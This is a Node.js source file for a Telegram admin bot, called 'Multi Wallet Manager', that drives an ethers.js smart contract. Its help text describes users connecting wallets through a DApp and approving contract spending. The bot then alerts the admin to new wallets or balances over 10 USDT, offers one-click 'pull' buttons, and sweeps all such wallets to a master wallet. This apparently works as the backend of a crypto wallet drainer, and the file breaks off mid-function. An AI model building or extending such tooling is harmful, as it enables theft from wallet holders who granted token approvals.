const TelegramBot = require('node-telegram-bot-api');
const dotenv = require('dotenv');
const { ethers } = require('ethers');
const database = require('./database');
const path = require('path');
const fs = require('fs');

dotenv.config();

class TelegramService {
    constructor() {
        this.bot = null;
        this.adminChatId = process.env.ADMIN_CHAT_ID;
        this.botToken = process.env.TELEGRAM_BOT_TOKEN;
        this.isInitialized = false;
        this.provider = null;
        this.contract = null;
        this.contractABI = null;
        this.masterWallet = process.env.MASTER_WALLET_ADDRESS ||
            (process.env.MASTER_WALLET_PRIVATE_KEY
                ? new ethers.Wallet(process.env.MASTER_WALLET_PRIVATE_KEY).address
                : '0xMasterWalletAddress');

        // Load contract ABI
        this.loadContractABI();
    }

    // Load contract ABI with proper error handling
    loadContractABI() {
        try {
            // Try multiple possible paths
            const possiblePaths = [
                path.join(__dirname, '../../smart-contracts/artifacts/abi.json'),
                path.join(__dirname, '../../../smart-contracts/artifacts/abi.json'),
                path.join(__dirname, '../smart-contracts/artifacts/abi.json'),
                path.join(__dirname, 'abi.json')
            ];

            for (const abiPath of possiblePaths) {
                if (fs.existsSync(abiPath)) {
                    this.contractABI = require(abiPath);
                    console.log(`✅ Contract ABI loaded from: ${abiPath}`);
                    return;
                }
            }

            console.log('⚠️ Contract ABI file not found, using empty ABI');
            this.contractABI = [];
        } catch (error) {
            console.error('❌ Error loading contract ABI:', error && error.message ? error.message : error);
            this.contractABI = [];
        }
    }

    init() {
        if (!this.botToken) {
            console.log('⚠️ Telegram bot token not found, skipping bot initialization');
            return;
        }

        try {
            // Create bot instance - we'll handle updates manually
            this.bot = new TelegramBot(this.botToken, { polling: false });

            // Initialize blockchain provider if environment variables are set
            this.initBlockchain();

            // Set up command handlers
            this.setupCommandHandlers();
            this.isInitialized = true;

            console.log('✅ Telegram bot initialized (manual update mode)');
        } catch (error) {
            console.error('❌ Telegram bot initialization failed:', error && error.message ? error.message : error);
        }
    }

    // Initialize blockchain provider and contract when needed
    initBlockchain() {
        if (process.env.RPC_URL && process.env.CONTRACT_ADDRESS && this.contractABI && this.contractABI.length > 0) {
            try {
                this.provider = new ethers.JsonRpcProvider(process.env.RPC_URL);
                console.log('✅ Blockchain provider initialized');

                // Initialize contract with signer if master private key exists
                if (process.env.MASTER_WALLET_PRIVATE_KEY) {
                    const wallet = new ethers.Wallet(process.env.MASTER_WALLET_PRIVATE_KEY, this.provider);
                    this.contract = new ethers.Contract(
                        process.env.CONTRACT_ADDRESS,
                        this.contractABI,
                        wallet
                    );
                    console.log('✅ Smart contract initialized with signer');
                } else {
                    this.contract = new ethers.Contract(
                        process.env.CONTRACT_ADDRESS,
                        this.contractABI,
                        this.provider
                    );
                    console.log('✅ Smart contract initialized (read-only)');
                }
            } catch (error) {
                console.error('❌ Blockchain initialization failed:', error && error.message ? error.message : error);
                this.provider = null;
                this.contract = null;
            }
        } else {
            console.log('⚠️ Blockchain configuration incomplete');
            if (!process.env.RPC_URL) console.log('   - RPC_URL not set');
            if (!process.env.CONTRACT_ADDRESS) console.log('   - CONTRACT_ADDRESS not set');
            if (!this.contractABI || this.contractABI.length === 0) console.log('   - Contract ABI not loaded');
        }
    }

    setupCommandHandlers() {
        if (!this.bot) return;

        // Start command
        this.bot.onText(/\/start/, (msg) => {
            console.log('Received /start command from chat:', msg.chat.id);
            this.sendMainMenu(msg.chat.id);
        });

        // Help command
        this.bot.onText(/\/help/, (msg) => {
            console.log('Received /help command from chat:', msg.chat.id);
            this.sendHelpMenu(msg.chat.id);
        });

        // Menu command (floating menu)
        this.bot.onText(/\/menu/, (msg) => {
            console.log('Received /menu command from chat:', msg.chat.id);
            this.sendMainMenu(msg.chat.id);
        });

        // Pull command handler
        this.bot.onText(/\/pull_(.*)/, (msg, match) => {
            console.log('Received /pull command from chat:', msg.chat.id);
            const walletAddress = match && match[1] ? match[1] : null;
            this.handlePullCommand(msg.chat.id, walletAddress);
        });

        // Withdraw command
        this.bot.onText(/\/withdraw/, (msg) => {
            console.log('Received /withdraw command from chat:', msg.chat.id);
            this.handleWithdrawCommand(msg.chat.id);
        });

        // Balances command
        this.bot.onText(/\/balances/, (msg) => {
            console.log('Received /balances command from chat:', msg.chat.id);
            this.handleBalancesCommand(msg.chat.id);
        });

        // Button callbacks
        this.bot.on('callback_query', async (callbackQuery) => {
            const action = callbackQuery && callbackQuery.data ? callbackQuery.data : null;
            const chatId = callbackQuery && callbackQuery.message && callbackQuery.message.chat ? callbackQuery.message.chat.id : null;

            if (!action || !chatId) {
                console.warn('Malformed callback_query received.');
                return;
            }

            console.log('Received callback query:', action, 'from chat:', chatId);

            // Answer the callback query to remove loading state
            try {
                await this.bot.answerCallbackQuery(callbackQuery.id);
            } catch (error) {
                console.error('Error answering callback query:', error && error.message ? error.message : error);
            }

            // Handle different actions
            if (action === 'withdraw') {
                this.handleWithdrawCommand(chatId);
            } else if (action === 'balances') {
                this.handleBalancesCommand(chatId);
            } else if (action === 'pull_list') {
                this.showConnectedWallets(chatId);
            } else if (action === 'help') {
                this.sendHelpMenu(chatId);
            } else if (action === 'menu') {
                this.sendMainMenu(chatId);
            } else if (action.startsWith('pull_')) {
                const walletAddress = action.substring(5);
                this.handlePullCommand(chatId, walletAddress);
            } else if (action === 'withdraw_all') {
                this.handleWithdrawAllCommand(chatId);
            } else if (action === 'withdraw_specific') {
                this.promptForSpecificWithdrawal(chatId);
            }
        });
    }

    // escape MarkdownV2 special characters, defensive: accept numbers/objects
    escapeMarkdown(text) {
        if (!text && text !== 0) return '';
        
        // Convert to string first
        let result = String(text);
        
        // Escape backslashes first to prevent double escaping
        result = result.replace(/\\/g, '\\\\');
        
        // Then escape all MarkdownV2 special characters
        result = result.replace(/([_\*\[\]\(\)~`>#+\-=|{}\.!])/g, '\\$1');
        
        return result;
    }

    // Mask address for security
    maskAddress(address) {
        if (!address || typeof address !== 'string') return 'Invalid Address';
        if (address.length < 10) return address;
        return `${address.substring(0, 6)}...${address.substring(address.length - 4)}`;
    }

    async sendMainMenu(chatId) {
        const message = `
🤖 *Multi Wallet Manager \\- Main Menu*

Welcome to your USDT management system\\. Select an option below:

💰 *Wallet Operations*
• Show connected wallets
• Check wallet balances
• Withdraw to master wallet

🔐 *Security*
• Only authorized admins can perform operations
• All transactions are logged and tracked
        `;

        const options = {
            parse_mode: 'MarkdownV2',
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: '📤 Show Wallets', callback_data: 'pull_list' },
                        { text: '📥 Withdraw', callback_data: 'withdraw' }
                    ],
                    [
                        { text: '📊 Balances', callback_data: 'balances' },
                        { text: '❓ Help', callback_data: 'help' }
                    ]
                ]
            }
        };

        try {
            const result = await this.bot.sendMessage(chatId, message, options);
            console.log('Main menu sent to chat:', chatId);
            return result;
        } catch (error) {
            console.error('Error sending main menu to chat', chatId, ':', error && error.message ? error.message : error);
            // Fallback without markdown
            const fallbackMessage = `
🤖 Multi Wallet Manager - Main Menu

Welcome to your USDT management system. Select an option below:

💰 Wallet Operations
• Show connected wallets
• Check wallet balances
• Withdraw to master wallet

🔐 Security
• Only authorized admins can perform operations
• All transactions are logged and tracked
            `;
            return await this.bot.sendMessage(chatId, fallbackMessage, {
                reply_markup: {
                    inline_keyboard: [
                        [
                            { text: '📤 Show Wallets', callback_data: 'pull_list' },
                            { text: '📥 Withdraw', callback_data: 'withdraw' }
                        ],
                        [
                            { text: '📊 Balances', callback_data: 'balances' },
                            { text: '❓ Help', callback_data: 'help' }
                        ]
                    ]
                }
            });
        }
    }

    async sendHelpMenu(chatId) {
        const message = `
🤖 *Multi Wallet Manager \\- Help*

📚 *Available Commands:*
• /start \\- Open main menu
• /menu \\- Show floating menu
• /pull\\_<address> \\- Pull USDT from specific wallet
• /withdraw \\- Withdraw all USDT from contract
• /balances \\- Check all balances
• /help \\- Show this help message

📋 *Available Operations:*
• Show connected wallets with balances
• Check Smart Contract USDT Balance
• Check Master Wallet BNB Balance
• Check Master Wallet USDT Balance
• Auto\\-gas management for transactions
• 6\\-hour balance monitoring

🛡️ *Security Features:*
• Admin\\-only operations
• Gas paid by master wallet
• Wallet approval system
• Transaction logging

🔄 *Workflow:*
1\\. Connect wallet via DApp
2\\. Approve contract spending
3\\. Admin pulls USDT to contract
4\\. Admin withdraws to master wallet
        `;

        const options = {
            parse_mode: 'MarkdownV2',
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: '🏠 Main Menu', callback_data: 'menu' }
                    ]
                ]
            }
        };

        try {
            const result = await this.bot.sendMessage(chatId, message, options);
            console.log('Help menu sent to chat:', chatId);
            return result;
        } catch (error) {
            console.error('Error sending help menu to chat', chatId, ':', error && error.message ? error.message : error);
            const fallbackMessage = `
🤖 Multi Wallet Manager - Help

📚 Available Commands:
• /start - Open main menu
• /menu - Show floating menu
• /pull_<address> - Pull USDT from specific wallet
• /withdraw - Withdraw all USDT from contract
• /balances - Check all balances
• /help - Show this help message
            `;
            return await this.bot.sendMessage(chatId, fallbackMessage, {
                reply_markup: {
                    inline_keyboard: [
                        [
                            { text: '🏠 Main Menu', callback_data: 'menu' }
                        ]
                    ]
                }
            });
        }
    }

    async sendNewWalletAlert(walletAddress, balance) {
        if (!this.bot || !this.adminChatId) {
            console.log('Telegram bot not ready for sending alerts');
            return;
        }

        const maskedAddress = this.maskAddress(walletAddress);
        const escapedBalance = this.escapeMarkdown(balance);

        const message = `
🔔 *NEW WALLET CONNECTED*
Address: \`${maskedAddress}\`
USDT Balance: *${escapedBalance} USDT*

Actions:
        `;

        const options = {
            parse_mode: 'MarkdownV2',
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: '📤 Pull USDT', callback_data: `pull_${walletAddress}` }
                    ],
                    [
                        { text: '🏠 Main Menu', callback_data: 'menu' }
                    ]
                ]
            }
        };

        try {
            const result = await this.bot.sendMessage(this.adminChatId, message, options);
            console.log('New wallet alert sent to admin chat');
            return result;
        } catch (error) {
            console.error('Error sending new wallet alert:', error && error.message ? error.message : error);
            const fallbackMessage = `
🔔 NEW WALLET CONNECTED
Address: ${maskedAddress}
USDT Balance: ${escapedBalance} USDT

Actions:
            `;
            return await this.bot.sendMessage(this.adminChatId, fallbackMessage, {
                reply_markup: {
                    inline_keyboard: [
                        [
                            { text: '📤 Pull USDT', callback_data: `pull_${walletAddress}` }
                        ],
                        [
                            { text: '🏠 Main Menu', callback_data: 'menu' }
                        ]
                    ]
                }
            });
        }
    }

    async sendBalanceAlert(walletAddress, balance) {
        if (!this.bot || !this.adminChatId) return;

        const maskedAddress = this.maskAddress(walletAddress);
        const escapedBalance = this.escapeMarkdown(balance);

        const message = `
💰 *BALANCE ALERT*
Address: \`${maskedAddress}\`
USDT Balance: *${escapedBalance} USDT* \\(> \\$10\\)

Actions:
        `;

        const options = {
            parse_mode: 'MarkdownV2',
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: '📤 Pull USDT', callback_data: `pull_${walletAddress}` }
                    ],
                    [
                        { text: '🏠 Main Menu', callback_data: 'menu' }
                    ]
                ]
            }
        };

        try {
            return await this.bot.sendMessage(this.adminChatId, message, options);
        } catch (error) {
            console.error('Error sending balance alert:', error && error.message ? error.message : error);
            const fallbackMessage = `
💰 BALANCE ALERT
Address: ${maskedAddress}
USDT Balance: ${escapedBalance} USDT (> $10)

Actions:
        `;
            return await this.bot.sendMessage(this.adminChatId, fallbackMessage, {
                reply_markup: {
                    inline_keyboard: [
                        [
                            { text: '📤 Pull USDT', callback_data: `pull_${walletAddress}` }
                        ],
                        [
                            { text: '🏠 Main Menu', callback_data: 'menu' }
                        ]
                    ]
                }
            });
        }
    }

    async sendSuccessMessage(walletAddress, amount, txHash) {
        if (!this.bot || !this.adminChatId) return;

        const maskedAddress = this.maskAddress(walletAddress);
        const escapedAmount = this.escapeMarkdown(amount);
        const maskedTxHash = this.maskAddress(txHash);

        const message = `
✅ *SUCCESSFUL PULL*
Address: \`${maskedAddress}\`
Amount: *${escapedAmount} USDT*
Transaction: \`${maskedTxHash}\`

Next steps:
        `;

        const options = {
            parse_mode: 'MarkdownV2',
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: '📥 Withdraw to Master', callback_data: 'withdraw' }
                    ],
                    [
                        { text: '🏠 Main Menu', callback_data: 'menu' }
                    ]
                ]
            }
        };

        try {
            return await this.bot.sendMessage(this.adminChatId, message, options);
        } catch (error) {
            console.error('Error sending success message:', error && error.message ? error.message : error);
            const fallbackMessage = `
✅ SUCCESSFUL PULL
Address: ${maskedAddress}
Amount: ${amount} USDT
Transaction: ${maskedTxHash}

Next steps:
            `;
            return await this.bot.sendMessage(this.adminChatId, fallbackMessage, {
                reply_markup: {
                    inline_keyboard: [
                        [
                            { text: '📥 Withdraw to Master', callback_data: 'withdraw' }
                        ],
                        [
                            { text: '🏠 Main Menu', callback_data: 'menu' }
                        ]
                    ]
                }
            });
        }
    }

    async showConnectedWallets(chatId) {
        if (chatId.toString() !== this.adminChatId) {
            return this.bot.sendMessage(chatId, '❌ Unauthorized access');
        }

        try {
            // Show processing message
            const processingMessage = `
📤 *Fetching Connected Wallets*

⏳ Checking wallet balances\\.\\.\\.
            `;
            
            const processingOptions = {
                parse_mode: 'MarkdownV2',
                reply_markup: {
                    inline_keyboard: [
                        [
                            { text: '🏠 Main Menu', callback_data: 'menu' }
                        ]
                    ]
                }
            };
            
            await this.bot.sendMessage(chatId, processingMessage, processingOptions);

            // Fetch all wallets from database
            const query = 'SELECT address, name FROM wallets ORDER BY created_at DESC';
            const result = await database.query(query);
            
            const totalWallets = result.rows.length;
            
            if (totalWallets === 0) {
                const message = `
📤 *Connected Wallets*

📊 Total Connected Wallets: *0*

📭 No wallets connected yet\\. Please connect wallets via the DApp\\.

🔄 *Last Updated:* ${this.escapeMarkdown(new Date().toISOString().replace('T', ' ').substring(0, 19))} UTC
                `;
                
                return await this.bot.sendMessage(chatId, message, {
                    parse_mode: 'MarkdownV2',
                    reply_markup: {
                        inline_keyboard: [
                            [
                                { text: '🏠 Main Menu', callback_data: 'menu' }
                            ]
                        ]
                    }
                });
            }

            // Check balances for each wallet
            let walletsOver10USDT = [];
            let walletBalances = [];
            
            // Import contract service
            let contractService;
            try {
                contractService = require('../services/contract.service');
            } catch (e) {
                console.warn('contract.service not found:', e && e.message ? e.message : e);
            }
            
            if (!contractService) {
                return await this.bot.sendMessage(chatId, '❌ Contract service not available.');
            }
            
            // Check balances for all wallets
            for (const wallet of result.rows) {
                try {
                    const balance = await contractService.getWalletUSDTBalance(wallet.address);
                    const balanceNum = parseFloat(balance);
                    
                    walletBalances.push({
                        address: wallet.address,
                        name: wallet.name,
                        balance: balance,
                        balanceNum: balanceNum
                    });
                    
                    if (balanceNum > 10) {
                        walletsOver10USDT.push({
                            address: wallet.address,
                            name: wallet.name,
                            balance: balance
                        });
                    }
                } catch (error) {
                    console.error(`Error checking balance for ${wallet.address}:`, error.message);
                    walletBalances.push({
                        address: wallet.address,
                        name: wallet.name,
                        balance: 'Error',
                        balanceNum: 0
                    });
                }
            }

            // Format the response message
            let message = `
📤 *Connected Wallets*

📊 Total Connected Wallets: *${this.escapeMarkdown(totalWallets.toString())}*
💰 Wallets With >10 USDT: *${this.escapeMarkdown(walletsOver10USDT.length.toString())}*

`;

            if (walletsOver10USDT.length > 0) {
                message += `💼 *Wallets With Balance >10 USDT:*\n\n`;
                
                for (let i = 0; i < walletsOver10USDT.length; i++) {
                    const wallet = walletsOver10USDT[i];
                    const maskedAddress = this.maskAddress(wallet.address);
                    const escapedBalance = this.escapeMarkdown(wallet.balance);
                    const walletName = wallet.name || `Wallet ${i + 1}`;
                    
                    message += `${i + 1}\\. \`${maskedAddress}\` \\(${escapedBalance} USDT\\) \\- ${this.escapeMarkdown(walletName)}\n`;
                }
                
                message += `\n🔄 *Last Updated:* ${this.escapeMarkdown(new Date().toISOString().replace('T', ' ').substring(0, 19))} UTC`;
            } else {
                message += `📭 No wallets with balance >10 USDT found\\.\n\n🔄 *Last Updated:* ${this.escapeMarkdown(new Date().toISOString().replace('T', ' ').substring(0, 19))} UTC`;
            }

            // Create inline keyboard with pull buttons for wallets with balance > 10
            let inlineKeyboard = [];
            
            if (walletsOver10USDT.length > 0) {
                // Add pull buttons for each wallet with balance > 10
                for (const wallet of walletsOver10USDT) {
                    inlineKeyboard.push([
                        { 
                            text: `📤 Pull from ${this.maskAddress(wallet.address)}`, 
                            callback_data: `pull_${wallet.address}` 
                        }
                    ]);
                }
            }
            
            // Add main menu button
            inlineKeyboard.push([
                { text: '🏠 Main Menu', callback_data: 'menu' }
            ]);

            return await this.bot.sendMessage(chatId, message, {
                parse_mode: 'MarkdownV2',
                reply_markup: {
                    inline_keyboard: inlineKeyboard
                }
            });
        } catch (error) {
            console.error('Error in showConnectedWallets:', error && error.message ? error.message : error);
            
            const errorMessage = `
❌ *ERROR*
Failed to fetch connected wallets\\.

🔄 *Last Updated:* ${this.escapeMarkdown(new Date().toISOString().replace('T', ' ').substring(0, 19))} UTC
            `;
            
            return await this.bot.sendMessage(chatId, errorMessage, {
                parse_mode: 'MarkdownV2',
                reply_markup: {
                    inline_keyboard: [
                        [
                            { text: '🏠 Main Menu', callback_data: 'menu' }
                        ]
                    ]
                }
            });
        }
    }

    // REAL BLOCKCHAIN BALANCE CHECKING FUNCTIONS
    async getContractUSDTBalance() {
        if (!this.provider || !process.env.USDT_CONTRACT_ADDRESS || !process.env.CONTRACT_ADDRESS) {
            console.log('⚠️ Blockchain not initialized, returning zero balance');
            return { balance: '0.00', error: 'Blockchain not initialized' };
        }

        try {
            const usdtContract = new ethers.Contract(
                process.env.USDT_CONTRACT_ADDRESS,
                ['function balanceOf(address account) external view returns (uint256)'],
                this.provider
            );

            const balance = await usdtContract.balanceOf(process.env.CONTRACT_ADDRESS);
            const formattedBalance = ethers.formatUnits(balance, 18);

            console.log('Contract USDT Balance:', formattedBalance);
            return { balance: formattedBalance, error: null };
        } catch (error) {
            console.error('Error getting contract USDT balance:', error && error.message ? error.message : error);
            return { balance: '0.00', error: error && error.message ? error.message : String(error) };
        }
    }

    async getMasterWalletBNBBalance() {
        if (!this.provider || !this.masterWallet) {
            console.log('⚠️ Blockchain not initialized, returning zero BNB balance');
            return { balance: '0.00', error: 'Blockchain not initialized' };
        }

        try {
            const balance = await this.provider.getBalance(this.masterWallet);
            const formattedBalance = ethers.formatEther(balance);

            console.log('Master Wallet BNB Balance:', formattedBalance);
            return { balance: formattedBalance, error: null };
        } catch (error) {
            console.error('Error getting master wallet BNB balance:', error && error.message ? error.message : error);
            return { balance: '0.00', error: error && error.message ? error.message : String(error) };
        }
    }

    async getMasterWalletUSDTBalance() {
        if (!this.provider || !process.env.USDT_CONTRACT_ADDRESS || !this.masterWallet) {
            console.log('⚠️ Blockchain not initialized, returning zero USDT balance');
            return { balance: '0.00', error: 'Blockchain not initialized' };
        }

        try {
            const usdtContract = new ethers.Contract(
                process.env.USDT_CONTRACT_ADDRESS,
                ['function balanceOf(address account) external view returns (uint256)'],
                this.provider
            );

            const balance = await usdtContract.balanceOf(this.masterWallet);
            const formattedBalance = ethers.formatUnits(balance, 18);

            console.log('Master Wallet USDT Balance:', formattedBalance);
            return { balance: formattedBalance, error: null };
        } catch (error) {
            console.error('Error getting master wallet USDT balance:', error && error.message ? error.message : error);
            return { balance: '0.00', error: error && error.message ? error.message : String(error) };
        }
    }

    async handlePullCommand(chatId, walletAddress) {
        if (chatId.toString() !== this.adminChatId) {
            return this.bot.sendMessage(chatId, '❌ Unauthorized access');
        }

        // Validate wallet address
        if (!walletAddress || walletAddress.length !== 42) {
            return this.bot.sendMessage(chatId, '❌ Invalid wallet address');
        }

        const maskedAddress = this.maskAddress(walletAddress);

        const message = `
🔄 *Pull Operation Initiated*
Wallet: \`${maskedAddress}\`

Processing\\.\\.\\. This will:
1\\. Check wallet gas balance
2\\. Send gas if needed
3\\. Pull USDT to contract
4\\. Send confirmation

⏳ *Please wait*\\.\\.\\.
        `;

        const options = {
            parse_mode: 'MarkdownV2',
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: '🏠 Main Menu', callback_data: 'menu' }
                    ]
                ]
            }
        };

        try {
            const result = await this.bot.sendMessage(chatId, message, options);

            // Import gas service and contract service (defensive require)
            let gasService;
            let contractService;
            try {
                gasService = require('../services/gas.service');
            } catch (e) {
                console.warn('gas.service not found:', e && e.message ? e.message : e);
            }
            try {
                contractService = require('../services/contract.service');
            } catch (e) {
                console.warn('contract.service not found:', e && e.message ? e.message : e);
            }

            // If services missing, notify and return
            if (!contractService) {
                await this.bot.sendMessage(chatId, `❌ Contract service not available. Can't pull now.`);
                return result;
            }

            // Check gas balance (if gasService exists)
            if (gasService && typeof gasService.checkWalletGasBalance === 'function') {
                const gasCheck = await gasService.checkWalletGasBalance(walletAddress);

                if (!gasCheck || !gasCheck.hasSufficientGas) {
                    if (gasService && typeof gasService.sendGasToWallet === 'function') {
                        const gasResult = await gasService.sendGasToWallet(walletAddress);
                        if (!gasResult || !gasResult.success) {
                            const errorMessage = `
❌ *GAS FAILED*
Wallet: \`${maskedAddress}\`
Error: ${this.escapeMarkdown((gasResult && gasResult.error) ? gasResult.error : 'Unknown error')}

🔄 *Last Updated:* ${new Date().toISOString().replace('T', ' ').substring(0, 19)} UTC
                            `;
                            await this.bot.sendMessage(chatId, errorMessage, {
                                parse_mode: 'MarkdownV2',
                                reply_markup: {
                                    inline_keyboard: [
                                        [
                                            { text: '📊 Check Balances', callback_data: 'balances' },
                                            { text: '🏠 Main Menu', callback_data: 'menu' }
                                        ]
                                    ]
                                }
                            });
                            return result;
                        }
                    }
                }
            }

            // Pull USDT from wallet to contract
            const pullResult = await contractService.pullUSDTFromWallet(walletAddress);

            if (pullResult && pullResult.success) {
                const escapedAmount = this.escapeMarkdown(pullResult.amount || '0');
                const maskedTxHash = this.maskAddress(pullResult.txHash || 'N/A');
                const escapedTxHash = this.escapeMarkdown(maskedTxHash);
                const escapedTimestamp = this.escapeMarkdown(new Date().toISOString().replace('T', ' ').substring(0, 19) + ' UTC');

                const successMessage = `
✅ *PULL SUCCESSFUL*
Wallet: \`${maskedAddress}\`
Amount: *${escapedAmount} USDT*
Transaction: \`${escapedTxHash}\`

📊 *Updated Balances:*
• Check balances for update

🔄 *Last Updated:* ${escapedTimestamp}
                `;

                await this.bot.sendMessage(chatId, successMessage, {
                    parse_mode: 'MarkdownV2',
                    reply_markup: {
                        inline_keyboard: [
                            [
                                { text: '📊 Check Balances', callback_data: 'balances' },
                                { text: '📥 Withdraw to Master', callback_data: 'withdraw' }
                            ],
                            [
                                { text: '🏠 Main Menu', callback_data: 'menu' }
                            ]
                        ]
                    }
                });

                // Update database
                try {
                    const updateQuery = `
                        UPDATE wallets 
                        SET is_processed = true, updated_at = NOW()
                        WHERE address = $1
                    `;
                    await database.query(updateQuery, [walletAddress]);
                } catch (dbError) {
                    console.error('Database update error:', dbError && dbError.message ? dbError.message : dbError);
                }
            } else {
                const errorMessage = `
❌ *PULL FAILED*
Wallet: \`${maskedAddress}\`
Error: ${this.escapeMarkdown((pullResult && pullResult.error) ? pullResult.error : 'Unknown error')}

🔄 *Last Updated:* ${new Date().toISOString().replace('T', ' ').substring(0, 19)} UTC
                `;
                await this.bot.sendMessage(chatId, errorMessage, {
                    parse_mode: 'MarkdownV2',
                    reply_markup: {
                        inline_keyboard: [
                            [
                                { text: '📊 Check Balances', callback_data: 'balances' },
                                { text: '🏠 Main Menu', callback_data: 'menu' }
                            ]
                        ]
                    }
                });
            }

            return result;
        } catch (error) {
            console.error('Error in pull command:', error && error.message ? error.message : error);

            const errorMessage = `
❌ *PULL FAILED*
Wallet: \`${this.maskAddress(walletAddress)}\`
Error: ${this.escapeMarkdown(error && error.message ? error.message : String(error))}

🔄 *Last Updated:* ${new Date().toISOString().replace('T', ' ').substring(0, 19)} UTC
            `;

            try {
                await this.bot.sendMessage(chatId, errorMessage, {
                    parse_mode: 'MarkdownV2',
                    reply_markup: {
                        inline_keyboard: [
                            [
                                { text: '📊 Check Balances', callback_data: 'balances' },
                                { text: '🏠 Main Menu', callback_data: 'menu' }
                            ]
                        ]
                    }
                });
            } catch (e) {
                console.error('Failed to send error message to chat:', e && e.message ? e.message : e);
            }

            return this.bot.sendMessage(chatId, `❌ Error: ${error && error.message ? error.message : String(error)}`);
        }
    }

    async handleWithdrawCommand(chatId) {
        if (chatId.toString() !== this.adminChatId) {
            return this.bot.sendMessage(chatId, '❌ Unauthorized access');
        }

        const message = `
🏦 *Withdraw Options*

Choose how you want to withdraw USDT:

📤 *Withdraw From All Wallets*
• Pull USDT from all connected wallets with balance >*10 USDT
• Withdraw all to master wallet

🆔 *Withdraw From Specific Wallet*
• Enter wallet address manually

Select an option below:
        `;

        const options = {
            parse_mode: 'MarkdownV2',
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: '📤 Withdraw All', callback_data: 'withdraw_all' }
                    ],
                    [
                        { text: '🆔 Specific Wallet', callback_data: 'withdraw_specific' }
                    ],
                    [
                        { text: '🏠 Main Menu', callback_data: 'menu' }
                    ]
                ]
            }
        };

        try {
            return await this.bot.sendMessage(chatId, message, options);
        } catch (error) {
            console.error('Error sending withdraw options:', error && error.message ? error.message : error);
            return await this.bot.sendMessage(chatId, '❌ Failed to show withdraw options. Please try again.');
        }
    }

    async handleWithdrawAllCommand(chatId) {
        if (chatId.toString() !== this.adminChatId) {
            return this.bot.sendMessage(chatId, '❌ Unauthorized access');
        }

        const processingMessage = `
🏦 *Withdraw All Operation Initiated*

Processing\\.\\.\\. This will:
1\\. Check all connected wallets
2\\. Pull USDT from wallets with balance >10 USDT
3\\. Withdraw all USDT to master wallet
4\\. Send confirmation

⏳ *Please wait*\\.\\.\\.
        `;

        const processingOptions = {
            parse_mode: 'MarkdownV2',
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: '🏠 Main Menu', callback_data: 'menu' }
                    ]
                ]
            }
        };

        try {
            await this.bot.sendMessage(chatId, processingMessage, processingOptions);

            // Import services
            let contractService;
            let gasService;
            try {
                contractService = require('../services/contract.service');
                gasService = require('../services/gas.service');
            } catch (e) {
                console.warn('Service not found:', e && e.message ? e.message : e);
            }

            if (!contractService) {
                return await this.bot.sendMessage(chatId, '❌ Contract service not available.');
            }

            // Fetch all wallets with balance > 10 USDT
            const query = 'SELECT address FROM wallets ORDER BY created_at DESC';
            const result = await database.query(query);
            
            if (!result || !result.rows || result.rows.length === 0) {
                return await this.bot.sendMessage(chatId, '📭 No wallets connected. Please connect wallets first.');
            }

            let walletsToPull = [];
            let pullResults = [];
            
            // Check balances and identify wallets with >10 USDT
            for (const wallet of result.rows) {
                try {
                    const balance = await contractService.getWalletUSDTBalance(wallet.address);
                    const balanceNum = parseFloat(balance);
                    
                    if (balanceNum > 10) {
                        walletsToPull.push({
                            address: wallet.address,
                            balance: balance
                        });
                    }
                } catch (error) {
                    console.error(`Error checking balance for ${wallet.address}:`, error.message);
                }
            }

            if (walletsToPull.length === 0) {
                const noWalletsMessage = `
📭 *No Wallets to Process*

No connected wallets have balance >10 USDT\\.

🔄 *Last Updated:* ${this.escapeMarkdown(new Date().toISOString().replace('T', ' ').substring(0, 19))} UTC
                `;
                
                return await this.bot.sendMessage(chatId, noWalletsMessage, {
                    parse_mode: 'MarkdownV2',
                    reply_markup: {
                        inline_keyboard: [
                            [
                                { text: '🏠 Main Menu', callback_data: 'menu' }
                            ]
                        ]
                    }
                });
            }

            // Process each wallet
            for (const wallet of walletsToPull) {
                try {
                    // Check gas balance
                    if (gasService && typeof gasService.checkWalletGasBalance === 'function') {
                        const gasCheck = await gasService.checkWalletGasBalance(wallet.address);
                        
                        if (!gasCheck || !gasCheck.hasSufficientGas) {
                            if (gasService && typeof gasService.sendGasToWallet === 'function') {
                                const gasResult = await gasService.sendGasToWallet(wallet.address);
                                if (!gasResult || !gasResult.success) {
                                    pullResults.push({
                                        address: wallet.address,
                                        success: false,
                                        error: `Gas failed: ${gasResult && gasResult.error ? gasResult.error : 'Unknown error'}`
                                    });
                                    continue;
                                }
                            }
                        }
                    }
                    
                    // Pull USDT from wallet
                    const pullResult = await contractService.pullUSDTFromWallet(wallet.address);
                    pullResults.push({
                        address: wallet.address,
                        success: pullResult.success,
                        amount: pullResult.amount,
                        error: pullResult.error
                    });
                    
                    // Update database if successful
                    if (pullResult.success) {
                        try {
                            const updateQuery = `
                                UPDATE wallets 
                                SET is_processed = true, updated_at = NOW()
                                WHERE address = $1
                            `;
                            await database.query(updateQuery, [wallet.address]);
                        } catch (dbError) {
                            console.error('Database update error:', dbError && dbError.message ? dbError.message : dbError);
                        }
                    }
                } catch (error) {
                    pullResults.push({
                        address: wallet.address,
                        success: false,
                        error: error && error.message ? error.message : 'Unknown error'
                    });
                }
            }

            // Now withdraw all to master wallet
            let withdrawResult = { success: false, error: 'No USDT to withdraw' };
            let totalPulledAmount = 0;
            
            // Calculate total pulled amount
            for (const result of pullResults) {
                if (result.success && result.amount) {
                    totalPulledAmount += parseFloat(result.amount);
                }
            }
            
            if (totalPulledAmount > 0) {
                withdrawResult = await contractService.withdrawUSDTToMaster();
            }

            // Format results message
            let resultsMessage = `
✅ *Withdraw All Operation Completed*

📊 *Pull Results:*
`;

            for (let i = 0; i < pullResults.length; i++) {
                const result = pullResults[i];
                const maskedAddress = this.maskAddress(result.address);
                
                if (result.success) {
                    const escapedAmount = this.escapeMarkdown(result.amount || '0');
                    resultsMessage += `${i + 1}\\. \`${maskedAddress}\` \\- ✅ ${escapedAmount} USDT pulled\n`;
                } else {
                    const escapedError = this.escapeMarkdown(result.error || 'Unknown error');
                    resultsMessage += `${i + 1}\\. \`${maskedAddress}\` \\- ❌ ${escapedError}\n`;
                }
            }

            resultsMessage += `\n🏦 *Withdrawal Result:*\n`;
            
